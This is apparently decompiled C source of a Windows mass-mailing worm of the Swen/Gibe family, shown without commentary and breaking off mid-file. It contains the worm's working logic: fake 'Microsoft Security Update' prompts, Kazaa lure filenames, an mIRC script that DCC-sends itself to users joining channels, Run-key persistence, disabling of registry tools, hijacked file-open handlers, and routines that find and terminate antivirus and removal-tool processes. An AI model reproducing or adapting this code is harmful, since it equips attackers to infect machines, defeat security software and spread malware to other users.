char aWw2FceVutbrCz[] = "ww2.fce.vutbr.cz"; // idb
char String2[] = "+OK "; // idb
char aStat[] = "STAT\r\n"; // idb
char aShowerror[] = "showerror"; // idb
CHAR Parameters[] = "autorun"; // idb
CHAR aXId_0[] = "X-ID"; // idb
CHAR aPopServer[] = "POP Server"; // idb
CHAR aPass[] = "Pass"; // idb
CHAR aLogin[] = "Login"; // idb
CHAR aCounterVisited[] = "Counter Visited"; // idb
char String[] = "yes"; // idb
CHAR aCacheboxOutfit[] = "CacheBox Outfit"; // idb
CHAR aVicname[] = "VicName"; // idb
CHAR aZipname[] = "ZipName"; // idb
CHAR aServer_0[] = "Server"; // idb
CHAR aEmailAddress[] = "Email Address"; // idb
CHAR WindowName[] = "Explorer XBaseBar"; // idb
char a215[] = "215"; // idb
char aList[] = "LIST\r\n"; // idb
char a20[] = "20"; // idb
char asc_411840[] = ".\r\n"; // idb
char a230[] = "230"; // idb
char aGmt[] = " GMT"; // idb
char a211[] = "211"; // idb
char a221[] = "221"; // idb
char aReplyTo[12] = "\r\nreply-to:"; // weak
char aFrom_1[] = "\r\nfrom:"; // idb
char a240[] = "240"; // idb
char a340[] = "340"; // idb
char aPost_0[] = "POST\r\n"; // idb
char asc_4118B4[] = ","; // idb
CHAR aErrorOccurred[] = "Error occurred"; // idb
char aMemoryAccessVi[] = "Memory access violation in module kernel32 at "; // idb
CHAR aRegisterservic[] = "RegisterServiceProcess"; // idb
char asc_411910[] = "\\"; // idb
CHAR SubKey[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer"; // idb
CHAR ValueName[] = "Remote Connection"; // idb
CHAR aSystemCurrentc[] = "System\\CurrentControlSet\\Services\\RemoteAccess"; // idb
char aWindowsExplore[17] = "Windows Explorer"; // weak
CHAR aInternetcloseh[] = "InternetCloseHandle"; // idb
CHAR aInternetgetcon[] = "InternetGetConnectedState"; // idb
CHAR aInternetopena[] = "InternetOpenA"; // idb
CHAR aWininetDll[] = "wininet.dll"; // idb
CHAR aMapi32[] = "MAPI32"; // idb
char aInvalidEmailAd[] = "Invalid Email Address"; // idb
char aInvalidServerN[] = "Invalid Server Name"; // idb
char aPasswordsDoNot[] = "Passwords do not match"; // idb
char aQ[2] = "q"; // weak
char aQ_0[] = "Q"; // idb
char aAck[4] = "ack"; // weak
char aAtch[5] = "atch"; // weak
char aP[2] = "p"; // weak
char aP_0[2] = "P"; // idb
char aPgrade[7] = "pgrade"; // weak
char aPdate[] = "pdate"; // idb
char aU[2] = "u"; // weak
char aU_0[2] = "U"; // idb
char aNstall[] = "nstall"; // idb
char aNstallation[12] = "nstallation"; // weak
char aNstaller[9] = "nstaller"; // weak
char aI_0[2] = "i"; // weak
char aI_1[2] = "I"; // idb
char Control[] = "()<>,;:\\\"[]"; // idb
char aDelete[] = "delete"; // idb
char aSpam[] = "spam"; // idb
char aEml[] = ".eml"; // idb
char aWab[] = ".wab"; // idb
char aDbx[] = ".dbx"; // idb
char aMbx[] = ".mbx"; // idb
char aAsp[] = "asp"; // idb
char aHt[3] = "ht"; // idb
char asc_411AD8[3] = ".."; // idb
char asc_411ADC[3] = "\\*"; // idb
char aMailto[] = "mailto:"; // idb
CHAR aUnfile[] = "Unfile"; // idb
char aAllUsers_0[] = "All Users"; // idb
char aDefaultUser[13] = "Default User"; // weak
char aAllUsers[] = "\\All Users"; // idb
char aWinme[6] = "WinMe"; // weak
char aWin95[6] = "Win95"; // weak
char aWin98[6] = "Win98"; // weak
CHAR aStartup[] = "Startup"; // idb
char aShellFolders[] = "\\Shell Folders"; // idb
char aVirusGenerator[16] = "Virus Generator"; // weak
char aMagicMushrooms[24] = "Magic Mushrooms Growing"; // weak
char aCookingWithCan[22] = "Cooking with Cannabis"; // weak
char aHallucinogenic[27] = "Hallucinogenic Screensaver"; // weak
char aMyNakedSister[16] = "My naked sister"; // weak
char aXxxPictures[13] = "XXX Pictures"; // weak
char aSickJoke[10] = "Sick Joke"; // weak
char aXxxVideo[10] = "XXX Video"; // weak
char aXpUpdate[10] = "XP update"; // weak
char aEmulatorPs2[13] = "Emulator PS2"; // weak
char aXboxEmulator[14] = "XboX Emulator"; // weak
char aSex[4] = "Sex"; // weak
char aHardporn[9] = "HardPorn"; // weak
char aJennaJameson[14] = "Jenna Jameson"; // weak
char a10000Serials[15] = "10.000 Serials"; // weak
char aHotmailHacker[15] = "Hotmail hacker"; // weak
char aYahooHacker[13] = "Yahoo hacker"; // weak
char aAolHacker[11] = "AOL hacker"; // weak
char aFixtool[8] = "fixtool"; // weak
char aCleaner[8] = "cleaner"; // weak
char aRemovalTool[13] = "removal tool"; // weak
char aRemover[8] = "remover"; // weak
char aKlez[5] = "Klez"; // weak
char aSobig[6] = "Sobig"; // weak
char aSircam[7] = "Sircam"; // weak
char aGibe[5] = "Gibe"; // weak
char aYaha[5] = "Yaha"; // weak
char aBugbear[8] = "Bugbear"; // weak
char aInstaller[10] = "installer"; // weak
char aUpload[7] = "upload"; // weak
char aWarez[6] = "warez"; // weak
char aHacked[7] = "hacked"; // weak
char aHack[5] = "hack"; // weak
char aKeyGenerator[14] = "key generator"; // weak
char aWindowsMediaPl[21] = "Windows Media Player"; // weak
char aGetrightFtp[13] = "GetRight FTP"; // weak
char aDownloadAccele[21] = "Download Accelerator"; // weak
char aMirc[5] = "Mirc"; // weak
char aWinamp[7] = "Winamp"; // weak
char aWinzip[7] = "WinZip"; // weak
char aWinrar[7] = "WinRar"; // weak
char aKazaa[6] = "KaZaA"; // weak
char aKazaaMediaDesk[20] = "KaZaA media desktop"; // weak
char aKazaaLite[11] = "Kazaa Lite"; // weak
char aSearchingForIn[] = "Searching for installed components ..."; // idb
char aExtractingFile[21] = "Extracting files ..."; // weak
char aCopyingFiles[18] = "Copying files ..."; // weak
char aUpdatingRegist[22] = "Updating registry ..."; // weak
char a012345[] = "012345:"; // idb
CHAR aThisUpdateHasB[] = "This update has been successfully installed."; // idb
CHAR aSoftwareMicros_5[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"; // idb
CHAR aDisableregistr[] = "DisableRegistryTools"; // idb
CHAR aRegfileShellOp[] = "regfile\\shell\\open\\command"; // idb
CHAR aScrfileShellCo[] = "scrfile\\shell\\config\\command"; // idb
CHAR aScrfileShellOp[] = "scrfile\\shell\\open\\command"; // idb
char aShellOpenComma[] = "\\shell\\open\\command"; // idb
char aExefile[] = "exefile"; // idb
char aComfile[8] = "comfile"; // weak
char aPiffile[8] = "piffile"; // weak
char aBatfile[8] = "batfile"; // weak
char aNntptmpFl[] = "nntptmp.fl"; // idb
char aSwen0Dat[] = "\\swen0.dat"; // idb
CHAR aNntpServer[] = "NNTP Server"; // idb
CHAR aSmtpDisplayNam[] = "SMTP Display Name"; // idb
CHAR aSmtpServer[] = "SMTP Server"; // idb
CHAR aSmtpEmailAddre[] = "SMTP Email Address"; // idb
char a00000001[] = "00000001"; // idb
CHAR aDefaultNewsAcc[] = "Default News Account"; // idb
CHAR aSoftwareMicros_3[] = "SOFTWARE\\Microsoft\\Internet Account Manager"; // idb
CHAR aDefaultMailAcc[] = "Default Mail Account"; // idb
CHAR aMircInstallFol[] = "Mirc Install Folder"; // idb
char aN3[] = "\"\r\nn3=}\r\n"; // idb
char aScriptN0On1Joi[] = "[script]\r\nn0= on 1:JOIN:#:{\r\nn1= /if ( $nick == $me ) { halt }\r\nn2= /.dcc send $nick \""; // idb
char aScriptBcp[] = "\\script.bcp"; // idb
char aScriptIni[] = "\\script.ini"; // idb
char aMircIni[] = "\\mirc.ini"; // idb
char aMirc32[] = "\\mirc32"; // idb
char aMirc_0[6] = "\\mirc"; // weak
CHAR aSoftwareMicros_2[] = "Software\\Microsoft\\Windows\\CurrentVersion"; // idb
CHAR aProgramfilesdi[] = "ProgramFilesDir"; // idb
char aC[] = "C:"; // idb
CHAR aKazaaInfect[] = "Kazaa Infect"; // idb
CHAR aDir99[] = "Dir99"; // idb
char aDldir0[] = "DlDir0"; // idb
char aTransfer[] = "\\Transfer"; // idb
char aDownloaddir[12] = "DownloadDir"; // weak
CHAR aDisablesharing[] = "DisableSharing"; // idb
char aLocalcontent[] = "\\LocalContent"; // idb
CHAR aSoftwareKazaa[] = "Software\\Kazaa"; // idb
char aSoftwareMicros_1[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\"; // idb
char aWinrarExe[] = "WinRar.exe"; // idb
char aWinzipExe[] = "WinZip.exe"; // idb
CHAR aThisWillInstal[] = "This will install Microsoft Security Update.\r\n\r\nDo you wish to continue?"; // idb
CHAR aInstallItem[] = "Install Item"; // idb
CHAR aSoftwareMicros_0[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; // idb
CHAR aThisUpdateDoes[] = "This update does not need to be installed on this system."; // idb
CHAR aMicrosoftInter[] = "Microsoft Internet Update Pack"; // idb
char aByBegbie[] = "... by Begbie"; // idb
CHAR aInstalled[] = "Installed"; // idb
CHAR aMovefileexa[] = "MoveFileExA"; // idb
CHAR aRegeditExe1[] = "regedit.exe \"%1\""; // idb
CHAR a1_0[] = "\"%1\""; // idb
CHAR a1S[] = "\"%1\" /S"; // idb
CHAR a1[] = "\"%1\" %*"; // idb
char aGerms0Dbv_0[] = "germs0.dbv"; // idb
char aGerms1Dbv_0[11] = "germs1.dbv"; // weak
char aSwen0Dat_0[10] = "swen0.dat"; // weak
char aSwen1Dat[10] = "swen1.dat"; // weak
char aNntpgroupsDat[15] = "nntpgroups.dat"; // weak
DWORD dwProcessId[50] =
{
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u
}; // weak
int dword_412DD0 = 0; // weak
HANDLE hObject = NULL; // idb
BYTE byte_412DD8[52] =
{
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u
}; // weak
int dword_412E0C = 0; // weak
BYTE Data = 0u; // idb
BYTE byte_412E74 = 0u; // idb
BYTE byte_412E94 = 0u; // idb
UINT_PTR nIDEvent = 0u; // idb
int dword_412EFC = 0; // weak
CHAR Buffer[52] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
int dword_412F34 = 0; // weak
BYTE byte_412F38[16] = { 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u }; // weak
SOCKET dword_412F48[7546] =
{
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  
}; // weak
BYTE byte_41A530; // idb
HINSTANCE hInstance; // idb
int dword_41A598; // weak
int dword_41A59C; // weak
BYTE byte_41A5A0; // idb
int dword_41A604; // weak
CHAR Destination[100]; // idb
int dword_41A66C; // weak
int dword_41A670; // weak
BYTE cp; // idb
int dword_41A6D8; // weak
HWND hWnd; // idb
int dword_41A6E0; // weak
int dword_41A6E4; // weak
CHAR sz[304]; // weak
int dword_41A818; // weak
int dword_41A81C; // weak
int dword_41A820; // weak
int dword_41A824; // weak


//----- (00401000) --------------------------------------------------------
size_t __cdecl sub_401000(char *a1, int a2)
{
  size_t result; // eax
  char *v3; // eax
  char *Source; // [esp+Ch] [ebp-124h]
  unsigned int i; // [esp+10h] [ebp-120h]
  char Str[260]; // [esp+14h] [ebp-11Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+118h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  Source = 0;
  result = strlen(a1);
  if ( result )
  {
    if ( a2 )
      Source = strrchr(a1, 92);
    if ( Source )
      v3 = strcpy(Str, Source + 1);
    else
      v3 = strcpy(Str, a1);
    CharLowerA(v3);
    for ( i = 0; i < 0x6D; ++i )
    {
      if ( strstr(Str, (&SubStr)[i]) )
      {
        result = 1;
        goto LABEL_11;
      }
    }
    return 0;
  }
  else
  {
LABEL_11:
    ms_exc.registration.TryLevel = -1;
  }
  return result;
}

//----- (004010E3) --------------------------------------------------------
int __cdecl sub_4010E3(LPCSTR lptstrFilename, char *Destination)
{
  int result; // eax
  CHAR v3[20]; // [esp+Ch] [ebp-1468h] BYREF
  char Data[5120]; // [esp+20h] [ebp-1454h] BYREF
  LPVOID lpBuffer; // [esp+1420h] [ebp-54h] BYREF
  unsigned int puLen; // [esp+1424h] [ebp-50h] BYREF
  CHAR SubBlock[52]; // [esp+1428h] [ebp-4Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+145Ch] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  *Destination = 0;
  result = GetFileVersionInfoA(lptstrFilename, 0, 0x1400u, Data);
  if ( result )
  {
    result = VerQueryValueA(Data, ::SubBlock, &lpBuffer, &puLen);
    if ( result )
    {
      if ( puLen )
      {
        result = wsprintfA(v3, "%04X%04X", *(unsigned __int16 *)lpBuffer, HIWORD(*(_DWORD *)lpBuffer));
        if ( result == 8 )
        {
          wsprintfA(SubBlock, "\\StringFileInfo\\%s\\OriginalFilename", v3);
          result = VerQueryValueA(Data, SubBlock, &lpBuffer, &puLen);
          if ( result )
          {
            if ( puLen )
            {
              if ( puLen <= 0x27 )
              {
                strncpy(Destination, (const char *)lpBuffer, puLen);
                result = puLen;
                Destination[puLen] = 0;
              }
            }
          }
        }
      }
    }
  }
  return result;
}

//----- (004011FF) --------------------------------------------------------
BOOL __stdcall EnumFunc(HWND hWnd, LPARAM a2)
{
  unsigned int i; // eax
  DWORD dwProcessId; // [esp+10h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+14h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  if ( !GetParent(hWnd) )
  {
    GetWindowThreadProcessId(hWnd, &dwProcessId);
    for ( i = 0; i < dword_412DD0; ++i )
    {
      if ( dwProcessId == ::dwProcessId[i] )
      {
        PostMessageA(hWnd, 2u, 0, 0);
        PostMessageA(hWnd, 0x10u, 0, 0);
        return 1;
      }
    }
  }
  return 1;
}
// 412D08: using guessed type DWORD dwProcessId[50];
// 412DD0: using guessed type int dword_412DD0;

//----- (00401294) --------------------------------------------------------
HANDLE sub_401294()
{
  HANDLE result; // eax
  unsigned int i; // edi
  HANDLE v2; // esi

  result = (HANDLE)EnumWindows(EnumFunc, 0);
  for ( i = 0; i < dword_412DD0; ++i )
  {
    result = (HANDLE)dwProcessId[i];
    if ( result )
    {
      result = OpenProcess(0x100001u, 0, dwProcessId[i]);
      v2 = result;
      if ( result )
      {
        if ( WaitForSingleObject(result, 0xC8u) == 258 )
          TerminateProcess(v2, 0);
        result = (HANDLE)CloseHandle(v2);
      }
    }
  }
  return result;
}
// 412D08: using guessed type DWORD dwProcessId[50];
// 412DD0: using guessed type int dword_412DD0;

//----- (0040133B) --------------------------------------------------------
void __stdcall sub_40133B(HWND a1, UINT a2, UINT_PTR a3, DWORD a4)
{
  HMODULE LibraryA; // eax
  HMODULE v5; // edi
  FARPROC (__stdcall *v6)(HMODULE, LPCSTR); // esi
  FARPROC GetModuleFileNameExA; // eax
  DWORD *v8; // edi
  HANDLE v9; // ebx
  int v10; // eax
  HMODULE ModuleHandleA; // eax
  HMODULE v12; // edi
  BOOL (__stdcall *Process32Next)(HANDLE, LPPROCESSENTRY32); // eax
  HANDLE v14; // edi
  int i; // eax
  HMODULE v16; // eax
  int (*v17)(void); // eax
  HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD, DWORD); // [esp+18h] [ebp-408h]
  int v19[74]; // [esp+1Ch] [ebp-404h] BYREF
  BOOL (__stdcall *Process32First)(HANDLE, LPPROCESSENTRY32); // [esp+144h] [ebp-2DCh]
  BOOL (__stdcall *v21)(HANDLE, LPPROCESSENTRY32); // [esp+148h] [ebp-2D8h]
  FARPROC EnumProcesses; // [esp+14Ch] [ebp-2D4h]
  int (__stdcall *v23)(HANDLE, int, char *, int); // [esp+150h] [ebp-2D0h]
  int v24; // [esp+154h] [ebp-2CCh] BYREF
  int v25[101]; // [esp+158h] [ebp-2C8h] BYREF
  FARPROC EnumProcessModules; // [esp+2ECh] [ebp-134h]
  char v27[264]; // [esp+2F0h] [ebp-130h] BYREF
  HMODULE v28; // [esp+3F8h] [ebp-28h]
  HMODULE v29; // [esp+3FCh] [ebp-24h]
  unsigned int v30; // [esp+400h] [ebp-20h]
  unsigned int v31; // [esp+404h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+408h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  memset(dwProcessId, 0, sizeof(dwProcessId));
  dword_412DD0 = 0;
  if ( dword_41A66C )
  {
    memset(v19, 0, sizeof(v19));
    ModuleHandleA = GetModuleHandleA(ModuleName);
    v12 = ModuleHandleA;
    if ( !ModuleHandleA )
      return;
    v6 = GetProcAddress;
    CreateToolhelp32Snapshot = (HANDLE (__stdcall *)(DWORD, DWORD))GetProcAddress(ModuleHandleA, aCreatetoolhelp);
    Process32First = (BOOL (__stdcall *)(HANDLE, LPPROCESSENTRY32))GetProcAddress(v12, aProcess32first);
    Process32Next = (BOOL (__stdcall *)(HANDLE, LPPROCESSENTRY32))GetProcAddress(v12, aProcess32next);
    v21 = Process32Next;
    if ( !CreateToolhelp32Snapshot )
      return;
    if ( !Process32First )
      return;
    if ( !Process32Next )
      return;
    v14 = CreateToolhelp32Snapshot(2, 0);
    if ( v14 == (HANDLE)-1 )
      return;
    v19[0] = 296;
    for ( i = Process32First(v14, (LPPROCESSENTRY32)v19); i; i = v21(v14, (LPPROCESSENTRY32)v19) )
    {
      if ( sub_401000((char *)&v19[9], 1) )
        dwProcessId[dword_412DD0++] = v19[2];
    }
    CloseHandle(v14);
  }
  else
  {
    memset(v25, 0, 400);
    LibraryA = LoadLibraryA(LibFileName);
    v5 = LibraryA;
    v28 = LibraryA;
    if ( !LibraryA )
      return;
    v6 = GetProcAddress;
    EnumProcesses = GetProcAddress(LibraryA, ProcName);
    EnumProcessModules = GetProcAddress(v5, aEnumprocessmod);
    GetModuleFileNameExA = GetProcAddress(v5, aGetmodulefilen);
    v23 = (int (__stdcall *)(HANDLE, int, char *, int))GetModuleFileNameExA;
    if ( !EnumProcesses || !EnumProcessModules || !GetModuleFileNameExA )
    {
      FreeLibrary(v5);
      return;
    }
    if ( ((int (__stdcall *)(int *, int, unsigned int *))EnumProcesses)(v25, 400, &v31) )
    {
      v30 = 0;
      while ( v30 < v31 >> 2 )
      {
        v8 = (DWORD *)&v25[v30];
        v9 = OpenProcess(0x410u, 0, *v8);
        v25[100] = (int)v9;
        if ( v9 )
        {
          if ( ((int (__stdcall *)(HANDLE, int *, int, unsigned int *))EnumProcessModules)(v9, &v24, 4, &v31) )
          {
            v10 = v23(v9, v24, v27, 261);
            v31 = v10;
            if ( v10 )
            {
              v27[v10] = 0;
              if ( sub_401000(v27, 1) )
                dwProcessId[dword_412DD0++] = *v8;
            }
          }
          CloseHandle(v9);
        }
        ++v30;
        v5 = v28;
      }
    }
    FreeLibrary(v5);
  }
  if ( dword_412DD0 )
    sub_401294();
  v16 = GetModuleHandleA(ModuleName);
  v29 = v16;
  if ( v16 )
  {
    v17 = v6(v16, aIsdebuggerpres);
    if ( v17 )
    {
      if ( v17() )
      {
        MessageBoxA(0, Text, Caption, 0);
        PostMessageA(HWND_BROADCAST, 0x12u, 0, 0);
        ExitProcess(0);
      }
    }
  }
}
// 412D08: using guessed type DWORD dwProcessId[50];
// 412DD0: using guessed type int dword_412DD0;
// 41A66C: using guessed type int dword_41A66C;
// 40133B: using guessed type char var_130[264];

//----- (0040166C) --------------------------------------------------------
size_t __thiscall sub_40166C(int this)
{
  size_t result; // eax
  size_t v3; // eax
  int v4; // eax
  const char *v5; // eax
  char *v6; // eax
  int v7; // [esp+10h] [ebp-755Ch]
  char buf[30000]; // [esp+14h] [ebp-7558h] BYREF
  const char *v9; // [esp+7544h] [ebp-28h]
  size_t Count; // [esp+7548h] [ebp-24h]
  size_t v11; // [esp+754Ch] [ebp-20h]
  char *v12; // [esp+7550h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+7554h] [ebp-18h]

  v7 = 0;
  ms_exc.registration.TryLevel = 0;
  if ( !*(_DWORD *)this )
    goto LABEL_2;
  v3 = strlen((const char *)(this + 4));
  v11 = 29999 - v3;
  if ( v3 == 29999 )
  {
    SetEvent(hObject);
    Sleep(0);
LABEL_2:
    result = 0;
    goto LABEL_3;
  }
  v4 = recv(*(_DWORD *)this, buf, 29999 - v3, 0);
  Count = v4;
  if ( v4 == -1 || !v4 )
    goto LABEL_2;
  buf[v4] = 0;
  EnterCriticalSection((LPCRITICAL_SECTION)(this + 30160));
  strncat((char *)(this + 4), buf, Count);
  LeaveCriticalSection((LPCRITICAL_SECTION)(this + 30160));
  if ( strlen((const char *)(this + 4)) + 1 < 0x7530 )
  {
    EnterCriticalSection((LPCRITICAL_SECTION)(this + 30160));
    if ( *(_DWORD *)(this + 30004) )
    {
      v5 = (const char *)(this + 4);
      v9 = (const char *)(this + 4);
      do
      {
        v6 = strstr(v5, asc_4106F0);
        v12 = v6;
        if ( !v6 )
          break;
        ++v7;
        v5 = v6 + 2;
        v9 = v5;
      }
      while ( *(_DWORD *)(this + 30004) != 1 );
      if ( v7 == *(_DWORD *)(this + 30004) )
        SetEvent(hObject);
      Sleep(0);
    }
    else if ( strlen((const char *)(this + 4)) > 4 )
    {
      v9 = (const char *)(strlen((const char *)(this + 4)) + this - 1);
      if ( !strncmp(v9, Str2, 5u) )
        SetEvent(hObject);
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)(this + 30160));
  }
  else
  {
    SetEvent(hObject);
    Sleep(0);
  }
  result = Count;
LABEL_3:
  ms_exc.registration.TryLevel = -1;
  return result;
}
// 40166C: using guessed type char buf[30000];

//----- (00401830) --------------------------------------------------------
char *__thiscall sub_401830(int this, char *Destination, size_t Count)
{
  struct _RTL_CRITICAL_SECTION *v4; // edi
  const char *v5; // esi

  if ( Count > 0x752F )
    Count = 29999;
  v4 = (struct _RTL_CRITICAL_SECTION *)(this + 30160);
  EnterCriticalSection((LPCRITICAL_SECTION)(this + 30160));
  v5 = (const char *)(this + 4);
  strncpy(Destination, v5, Count);
  Destination[Count] = 0;
  *v5 = 0;
  LeaveCriticalSection(v4);
  return Destination;
}

//----- (004018C0) --------------------------------------------------------
SOCKET sub_4018C0()
{
  SOCKET result; // eax

  result = socket(2, 1, 6);
  if ( result == -1 )
    return 0;
  return result;
}

//----- (004018D3) --------------------------------------------------------
SOCKET __thiscall sub_4018D3(int this)
{
  SOCKET result; // eax

  result = *(_DWORD *)this;
  if ( *(_DWORD *)this )
  {
    closesocket(*(_DWORD *)this);
    *(_DWORD *)this = 0;
    *(_BYTE *)(this + 30008) = 0;
    *(_WORD *)(this + 30158) = 0;
    *(_BYTE *)(this + 4) = 0;
    return SetEvent(hObject);
  }
  return result;
}

//----- (00401946) --------------------------------------------------------
int __thiscall sub_401946(int this, char *cp, u_short hostshort, HWND hWnd)
{
  int result; // eax
  SOCKET v6; // eax
  struct hostent *v7; // eax
  struct sockaddr name; // [esp+14h] [ebp-34h] BYREF
  void *Src; // [esp+24h] [ebp-24h] BYREF
  int v10; // [esp+28h] [ebp-20h]
  unsigned int v11; // [esp+2Ch] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+30h] [ebp-18h]

  v11 = -1;
  ms_exc.registration.TryLevel = 0;
  ResetEvent(hObject);
  if ( !*(_DWORD *)this || _strcmpi((const char *)(this + 30008), cp) || *(_WORD *)(this + 30158) != hostshort )
  {
    sub_4018D3(this);
    v6 = sub_4018C0();
    *(_DWORD *)this = v6;
    if ( !v6 )
    {
      *(_DWORD *)this = 0;
LABEL_14:
      result = 0;
      goto LABEL_5;
    }
    v11 = inet_addr(cp);
    if ( v11 == -1 )
    {
      v7 = gethostbyname(cp);
      if ( !v7 )
      {
LABEL_13:
        sub_4018D3(this);
        goto LABEL_14;
      }
      memcpy(&Src, v7->h_addr_list, sizeof(Src));
      memcpy(&v11, Src, sizeof(v11));
    }
    name.sa_family = 2;
    *(_WORD *)name.sa_data = htons(hostshort);
    *(_DWORD *)&name.sa_data[2] = v11;
    v10 = connect(*(_DWORD *)this, &name, 16);
    if ( v10 != -1 && WSAAsyncSelect(*(_DWORD *)this, hWnd, 0x414u, 33) != -1 )
    {
      strcpy((char *)(this + 30008), cp);
      *(_WORD *)(this + 30158) = hostshort;
      result = 1;
      goto LABEL_5;
    }
    goto LABEL_13;
  }
  result = -1;
LABEL_5:
  ms_exc.registration.TryLevel = -1;
  return result;
}

//----- (00401A9E) --------------------------------------------------------
int __thiscall sub_401A9E(SOCKET *this, char *buf)
{
  int result; // eax
  int v4; // eax

  result = 0;
  if ( *this )
  {
    v4 = strlen(buf);
    return send(*this, buf, v4, 0);
  }
  return result;
}

//----- (00401B0D) --------------------------------------------------------
BOOL __thiscall sub_401B0D(_DWORD *this)
{
  return *this != 0;
}

//----- (00401B15) --------------------------------------------------------
int __thiscall sub_401B15(_DWORD *this, int a2)
{
  int result; // eax

  result = a2;
  this[7501] = a2;
  return result;
}

//----- (00401B22) --------------------------------------------------------
int __thiscall sub_401B22(char **this, LPSTR lpsz, int a3)
{
  char *i; // edi
  int result; // eax
  char *v6; // eax

  if ( strlen(lpsz) > 0x40 || !*lpsz )
    return 0;
  if ( a3 )
    CharLowerA(lpsz);
  for ( i = *this; i; i = (char *)*((_DWORD *)i + 17) )
  {
    result = strcmp(i, lpsz);
    if ( !result )
      return result;
  }
  v6 = (char *)operator new(0x48u);
  if ( this[2] )
    *((_DWORD *)this[1] + 17) = v6;
  else
    *this = v6;
  this[1] = v6;
  strcpy(v6, lpsz);
  *((_DWORD *)this[1] + 17) = 0;
  ++this[2];
  return 1;
}

//----- (00401BE7) --------------------------------------------------------
void __thiscall sub_401BE7(_DWORD *this)
{
  _DWORD *i; // eax
  _DWORD *v3; // edi

  if ( this[2] )
  {
    for ( i = (_DWORD *)*this; i; i = v3 )
    {
      v3 = (_DWORD *)i[17];
      operator delete(i);
    }
    this[2] = 0;
    *this = 0;
    this[1] = 0;
  }
}

//----- (00401C5A) --------------------------------------------------------
int __thiscall sub_401C5A(int *this, LPCSTR lpFileName)
{
  int v3; // eax
  _BYTE *v4; // eax
  int result; // eax
  int i; // esi
  HANDLE FileA; // esi
  DWORD nNumberOfBytesToWrite; // [esp+20h] [ebp-2Ch]
  size_t nNumberOfBytesToWritea; // [esp+20h] [ebp-2Ch]
  DWORD NumberOfBytesWritten; // [esp+24h] [ebp-28h] BYREF
  LONG DistanceToMoveHigh; // [esp+28h] [ebp-24h] BYREF
  LPCVOID lpBuffer; // [esp+2Ch] [ebp-20h]
  int v13; // [esp+30h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+34h] [ebp-18h]

  nNumberOfBytesToWrite = 0;
  ms_exc.registration.TryLevel = 0;
  v3 = this[2];
  if ( !v3 )
    return 0;
  v4 = operator new(66 * v3);
  lpBuffer = v4;
  if ( v4 )
  {
    *v4 = 0;
    for ( i = *this; i; i = v13 )
    {
      nNumberOfBytesToWrite += strlen((const char *)i) + 1;
      if ( nNumberOfBytesToWrite >= 66 * this[2] )
        break;
      v13 = *(_DWORD *)(i + 68);
      strcat((char *)lpBuffer, Source);
      strcat((char *)lpBuffer, (const char *)i);
    }
    nNumberOfBytesToWritea = strlen((const char *)lpBuffer);
    FileA = CreateFileA(lpFileName, 0x40000000u, 3u, 0, 4u, 0x80u, 0);
    if ( FileA != (HANDLE)-1 )
    {
      DistanceToMoveHigh = 0;
      SetFilePointer(FileA, 0, &DistanceToMoveHigh, 2u);
      WriteFile(FileA, lpBuffer, nNumberOfBytesToWritea, &NumberOfBytesWritten, 0);
      CloseHandle(FileA);
    }
    operator delete((void *)lpBuffer);
    result = 1;
  }
  else
  {
    result = 0;
  }
  ms_exc.registration.TryLevel = -1;
  return result;
}

//----- (00401D8A) --------------------------------------------------------
int __thiscall sub_401D8A(_DWORD *this)
{
  return this[2];
}

//----- (00401D8E) --------------------------------------------------------
